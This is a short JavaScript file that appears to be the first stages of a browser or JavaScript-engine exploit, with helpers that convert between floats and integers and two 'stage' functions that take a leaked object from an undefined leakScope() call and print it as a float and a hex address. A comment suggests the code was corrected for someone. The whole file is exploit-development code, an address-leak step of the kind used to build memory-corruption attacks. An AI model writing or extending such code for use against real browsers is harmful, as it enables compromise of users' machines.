var leak = null;

let float64 = new Float64Array(1);
let u32 = new Uint32Array(float64.buffer);
let arr;
let f64arr;

function ftoi(val) {
    float64[0] = val;
    return u32[0] + u32[1] * 0x100000000;
}

function itof(val) {
    u32[0] = val % 0x100000000;
    u32[1] = Math.floor(val / 0x100000000);
    return float64[0];
}

function pirim_stage1() {
    leak = leakScope();
    if (leak === null) {
        log("Stage 1 failed: no leak returned");
    } else {
        log("Stage 1 success: leaked object is " + leak);
    }
}


function pirim_stage2() {
    arr = [leak];
    f64arr = new Float64Array(1);
    f64arr[0] = arr[0]; // fixed: you had `f63arr`
    log("leak as float64: " + f64arr[0]);
    log("leak as hex: 0x" + ftoi(f64arr[0]).toString(16));
}
